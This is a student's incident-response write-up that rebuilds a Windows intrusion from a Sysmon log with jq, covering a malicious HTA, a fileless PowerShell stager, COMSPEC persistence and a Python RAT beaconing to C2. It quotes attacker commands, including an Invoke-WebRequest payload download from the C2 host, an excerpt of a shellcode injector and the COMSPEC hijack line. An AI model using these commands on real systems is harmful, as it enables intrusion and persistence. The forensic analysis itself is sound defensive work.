---
title: "82,847 log lines, one attack chain: a Sysmon intrusion reconstructed"
date: 2026-06-23T12:00:00+05:30
draft: false
tags: ["dfir", "incident-response", "sysmon", "malware-analysis", "lolbin"]
summary: "A Windows endpoint compromised by a single malicious HTA — and the whole chain (mshta as a LOLBIN, a fileless PowerShell stager, a COMSPEC persistence trick that never touches the registry, and a self-replicating Python RAT beaconing to C2) reconstructed from an 82,847-line Sysmon export with nothing but jq."
ShowToc: true
TocOpen: false
cover:
  image: "covers/reconstructing-an-intrusion-from-sysmon.png"
  alt: "82,847 log lines, one attack chain — a Sysmon intrusion reconstructed"
  hiddenInSingle: true
---

An alert tells you *something* happened. A log tells you the *story* — if you can read it. The distance between those two is most of what incident response actually is.

One of my Incident Response & Threat Intelligence assignments at NFSU handed me that distance directly. No alert, no IOC list, no "start here." Just `sysmon-events.json` — 82,847 lines, 2.5 MB of one Windows endpoint's life — and a set of open questions: which file let the attacker in, how did they run code, how did they stay, what was the malware, and where did it call home. The rule that makes it forensics rather than guessing is the same one as in disk work: **every answer has to point at an event in the log, and anyone with the same file has to be able to reach it.** One tool for the whole thing — [`jq`](https://jqlang.github.io/jq/), the command-line JSON processor. This was my first real log-analysis investigation and jq was new to me; the queries below are the ones that survived a lot of trial and error.

Here's the investigation — one HTA file unravelling into a fileless PowerShell stager, a persistence trick that never writes to the registry, and a self-replicating Python RAT — reconstructed in the order the machine actually lived it.

## The shape of the evidence

Sysmon doesn't log everything; it logs the things you hunt with, each under a numbered **Event ID**. Four of them carried this entire case:

- **Event ID 1** — process creation (command line *and* parent process)
- **Event ID 3** — network connection
- **Event ID 11** — file creation
- **Event ID 13** — registry value set

The richest is **Event ID 1**, because it records not just *what* ran but *what spawned it*. That parent-child link turns out to be the spine of the whole investigation — so that's where I started.

## Pulling the thread: what ran?

With no map, the first question is simply: what executed at all?

```bash
jq -r '.Event | select(.System.EventID == 1) | .EventData.Image' sysmon-events.json | sort -u
```

```
C:\Program Files\Google\Chrome\Application\chrome.exe
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\SysWOW64\cmd.exe
C:\Windows\SysWOW64\ftp.exe
C:\Windows\SysWOW64\mshta.exe
C:\Windows\System32\consent.exe
C:\Windows\Temp\supply.exe
...
```

Most of that is Windows being Windows. Three lines don't belong:

- **`mshta.exe`** — the HTML Application host. Legitimate, Microsoft-signed, and almost never something you *want* to see running.
- **`supply.exe` in `C:\Windows\Temp\`** — a name no vendor ships, in a directory malware loves.
- **`ftp.exe`** — a file-transfer tool that's a near-museum piece on a modern desktop.

`mshta` plus an unknown binary in `Temp` is enough to stop being curious and start being worried.

## Following the parent

Here's the move that makes Sysmon worth running. Because Event ID 1 records each process *with its parent*, I can ask the log to lay out who-spawned-whom in time order:

```bash
jq -r '.Event | select(.System.EventID == 1) | "\(.System.TimeCreated."#attributes".SystemTime) | \(.EventData.Image) | Parent: \(.EventData.ParentImage)"' sysmon-events.json | sort | head -20
```

```
12:20:26 | mshta.exe        | Parent: chrome.exe
12:20:27 | powershell.exe   | Parent: mshta.exe
12:20:29 | powershell.exe   | Parent: powershell.exe
12:20:41 | cmd.exe          | Parent: powershell.exe
12:21:33 | powershell.exe   | Parent: cmd.exe
12:22:39 | ftp.exe          | Parent: cmd.exe
12:22:41 | supply.exe       | Parent: ftp.exe
12:22:41 | supply.exe       | Parent: supply.exe
```

Read the parents down the column and the entire intrusion falls out:

```
chrome.exe
  └─ mshta.exe                       12:20:26
       └─ powershell.exe             12:20:27
            └─ powershell.exe        12:20:29
                 └─ cmd.exe          12:20:41
                      └─ powershell.exe   12:21:33
                           └─ ftp.exe     12:22:39
                                └─ supply.exe  12:22:41  → spawns 6 copies of itself
```

A browser that spawns `mshta.exe`, which spawns PowerShell, which eventually pulls a binary out of `Temp` and runs it — that isn't a process tree, it's a confession. Every section below is just zooming into one link of this chain.

## Patient zero: a file that announced itself

`mshta`'s parent was Chrome, so the first thing the user must have done is download something. Event ID 11 logs file creation; filtering to files Chrome wrote around the time `mshta` fired:

```bash
jq -r '.Event | select(.System.EventID == 11) | select(.EventData.Image | contains("chrome")) | "\(.System.TimeCreated."#attributes".SystemTime) | \(.EventData.TargetFilename)"' sysmon-events.json | grep "12:20"
```

```
12:20:20 | C:\Users\IEUser\Downloads\de44892c-...-144844181950.tmp
12:20:23 | C:\Users\IEUser\Downloads\updater.hta:Zone.Identifier
```

The forensic tell is that `:Zone.Identifier` suffix. It's an **Alternate Data Stream** Windows staples onto anything pulled from the internet — the "mark of the web." Its presence proves `updater.hta` didn't originate on this machine; it was *downloaded*. And it landed **three seconds** before `mshta.exe` executed — exactly the gap of a user double-clicking a fresh download.

**Patient zero: `updater.hta`** — a malicious HTML Application, opened by the user *(ATT&CK T1566 Phishing → T1204 User Execution)*.

## Living off the land

Why an HTA? Because it gets to run through `mshta.exe`, a signed, trusted, pre-installed Windows binary — a textbook **LOLBIN** (Living Off the Land Binary). The attacker never brings a suspicious executable to the party for this stage; they borrow one Microsoft already shipped *(T1218.005 — Mshta)*. And the first thing it did was launch PowerShell:

```
"powershell.exe" -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAeg...
```

Three flags tell the whole intent before you decode a byte:

- `-nop` (`-NoProfile`) — don't load the user's profile, leave fewer traces
- `-w hidden` (`-WindowStyle Hidden`) — no visible window
- `-e` (`-EncodedCommand`) — what follows is Base64 *(T1059.001 PowerShell, T1027 obfuscation)*

Decoding that first stage (`base64 -d`) gives a small architecture check that re-launches PowerShell with a second, heavier blob — and that one needed **two** layers, Base64 *then* Gzip:

```bash
echo "H4sIAPgilWACA7VW+2+bSBD+OZHyP6DKkkF1DH5cm0SqdAs2No1xcPDb..." | base64 -d | gunzip
```

Out came a PowerShell **shellcode injector**: it resolves `VirtualAlloc` and `CreateThread` by hand, allocates a block of executable memory, copies raw machine code into it, and runs it in a new thread.

```powershell
$zm = ...GetDelegateForFunctionPointer((tLe kernel32.dll VirtualAlloc), ...)
       .Invoke([IntPtr]::Zero, $rdM.Length, 0x3000, 0x40)   # 0x40 = PAGE_EXECUTE_READWRITE
[Runtime.InteropServices.Marshal]::Copy($rdM, 0, $zm, $rdM.length)
$lMf = ...GetDelegateForFunctionPointer((tLe kernel32.dll CreateThread), ...).Invoke(...)
```

This is a **fileless** attack — the malicious code lives entirely in memory and never touches disk, which sidesteps every control that's only watching the filesystem *(T1055 Process Injection)*. Moments later the injected code opened the first reverse shell, to `192.168.1.11:1234`.

## The download that didn't bother to hide

The attacker's first stages were carefully encoded. The next command wasn't — and that's the one that handed me the payload:

```
powershell -c Invoke-WebRequest -Uri http://192.168.1.11:6969/supply.exe -OutFile C:\Windows\Temp\supply.exe
```

There's the cmdlet (`Invoke-WebRequest`), the C2 host (`192.168.1.11`), a deliberately odd port (`6969`), and the payload (`supply.exe`) dropped into `Temp` *(T1105 Ingress Tool Transfer)*. The out-of-place `ftp.exe` from the very first listing was the backup delivery channel for the same file.

## Persistence that never touched the registry

Most persistence eventually writes to the registry, so my first instinct was to query Event ID 13 (registry value set). It came back **empty** — and that dead end is itself the finding. Environment variables can be set from the command line without ever touching the registry, so I pivoted to every `cmd.exe` command line instead:

```bash
jq -r '.Event | select(.System.EventID == 1) | select(.EventData.Image | contains("cmd.exe")) | "\(.System.TimeCreated."#attributes".SystemTime) | \(.EventData.CommandLine)"' sysmon-events.json | sort
```

```
12:21:43 | cmd  \c set comspec=C:\windows\temp\supply.exe
```

One line, and it's vicious. **`COMSPEC`** is the environment variable Windows consults whenever *any* program needs to spawn a command shell — it normally points at `cmd.exe`. Repoint it at the malware, and from now on every process that innocently shells out runs `supply.exe` instead *(T1574 — Hijack Execution Flow)*. No registry key, no autostart entry, no scheduled task — nothing for a registry-focused hunt to ever see. The empty Event ID 13 wasn't the absence of persistence; it was the *signature* of this kind.

## The payload unmasks itself

I never had to reverse `supply.exe` to identify it — it told on itself through the files it dropped on first run (Event ID 11 again):

```bash
jq -r '.Event | select(.System.EventID == 11) | select(.EventData.Image | contains("supply")) | .EventData.TargetFilename' sysmon-events.json | head
```

```
C:\Users\IEUser\AppData\Local\Temp\_MEI53922\python27.dll
C:\Users\IEUser\AppData\Local\Temp\_MEI53922\msvcr90.dll
C:\Users\IEUser\AppData\Local\Temp\_MEI67082\python27.dll
...
```

Two giveaways. The **`_MEI` prefix** is the unmistakable fingerprint of **PyInstaller**, which unpacks its bundle into a `_MEIxxxxx` temp folder at runtime; and **`python27.dll`** pins the runtime to **Python 2.7**. So `supply.exe` is a Python 2.7 script frozen into an executable. The reason there are several `_MEI` folders is that the binary **self-replicated** — it spawned six copies of itself in the first second (the `supply.exe → supply.exe` rows from the process tree), each unpacking its own environment for redundancy and resilience.

It also reached for more. Among its command lines was a download of `JuicyPotato.exe` from the public `ohpe/juicy-potato` repo — a **privilege-escalation** tool that abuses `SeImpersonatePrivilege` to leap to `SYSTEM` *(T1134 Access Token Manipulation)*. The intrusion wasn't just trying to *run*; it was trying to *own the box*.

## Phoning home

Pull every outbound connection (Event ID 3, attacker-initiated) and tally it, and the C2 structure is unambiguous:

```bash
jq -r '.Event | select(.System.EventID == 3) | select(.EventData.Initiated == true) | "\(.EventData.DestinationIp):\(.EventData.DestinationPort)"' sysmon-events.json | sort | uniq -c | sort -rn
```

```
 198 192.168.1.11:8080
   1 192.168.1.11:6969
   1 192.168.1.11:1234
```

One host, three jobs: **1234** for the initial shell, **6969** for the payload download, and **8080** as the real command-and-control channel — 198 connections, the steady drumbeat of a **beacon** checking in for orders. That repetition is the behavioural signature of a Remote Access Trojan *(T1071 / T1571 — C2 over a non-standard port)*.

## The whole story in one frame

```
PHASE 1 · INITIAL ACCESS      12:20:20   Chrome downloads updater.hta; user opens it; mshta.exe runs
   ↓
PHASE 2 · EXECUTION           12:20:27   mshta → encoded PowerShell → in-memory shellcode → shell to :1234
   ↓
PHASE 3 · PAYLOAD DELIVERY    12:21:33   Invoke-WebRequest pulls supply.exe from :6969 (ftp.exe as backup)
   ↓
PHASE 4 · PERSISTENCE         12:21:43   set COMSPEC = C:\windows\temp\supply.exe   (no registry touched)
   ↓
PHASE 5 · C2 + ESCALATION     12:22:41   supply.exe (Python/PyInstaller RAT) self-replicates ×6,
                                         beacons to :8080, fetches JuicyPotato for SYSTEM
```

## ATT&CK at a glance

| Stage | What happened | Technique |
|---|---|---|
| Initial access | Malicious HTA downloaded and opened | T1566 · T1204 |
| Execution (LOLBIN) | `mshta.exe` proxies the payload | T1218.005 |
| Execution | Encoded/obfuscated PowerShell | T1059.001 · T1027 |
| Defense evasion | Fileless in-memory shellcode | T1055 |
| Ingress tool transfer | `Invoke-WebRequest` / `ftp` pull `supply.exe` | T1105 |
| Persistence | `COMSPEC` execution hijack | T1574 |
| Privilege escalation | JuicyPotato (`SeImpersonate`) | T1134 |
| Command & control | Beacon to `192.168.1.11:8080` | T1071 · T1571 |

## What 82,847 lines taught me

The techniques here aren't exotic — a handful of `jq` filters, `sort | uniq -c`, a couple of `base64 -d`. What made it an *investigation* was the order:

1. **Process tree before anything else.** Pairing each process with its parent turned 82,847 lines into an eight-line story, and every later query was just confirming one edge of that graph. Context first, details second.
2. **Fileless isn't invisible.** The cleverest stage of this attack never wrote to disk — but Sysmon still recorded the process that ran it and the socket it opened. You don't need the artefact if you have the behaviour.
3. **Absence is evidence.** The empty registry query wasn't a failure; it was the fingerprint of a COMSPEC hijack. A LOLBIN looks legitimate and fileless code leaves no file — which is exactly why you hunt the *relationships* between events, not any single event in isolation.

The most useful thing I came away with wasn't a jq incantation — it was the habit of reading logs as a narrative, where the value is in how each event connects to the next. The endpoint kept a perfect diary of its own compromise. The work was only ever learning to read it in order.

---

**Indicators of compromise**

```
updater.hta                          initial access (HTA, mark-of-the-web)
C:\Windows\Temp\supply.exe           Python 2.7 / PyInstaller RAT
JuicyPotato.exe                      privilege-escalation tool
192.168.1.11                         C2 host
  :1234  initial reverse shell   ·   :6969  payload download   ·   :8080  beacon
set COMSPEC=C:\windows\temp\supply.exe   persistence (execution hijack)
```
